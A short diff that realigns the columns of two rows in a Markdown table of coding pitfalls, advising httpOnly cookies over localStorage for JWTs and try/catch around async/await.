-| Storing JWT in localStorage | Security risk — prefer httpOnly cookie |
-| `async/await` without try/catch | Unhandled rejection — always wrap in try/catch |
+| Storing JWT in localStorage         | Security risk — prefer httpOnly cookie                         |
+| `async/await` without try/catch     | Unhandled rejection — always wrap in try/catch                 |
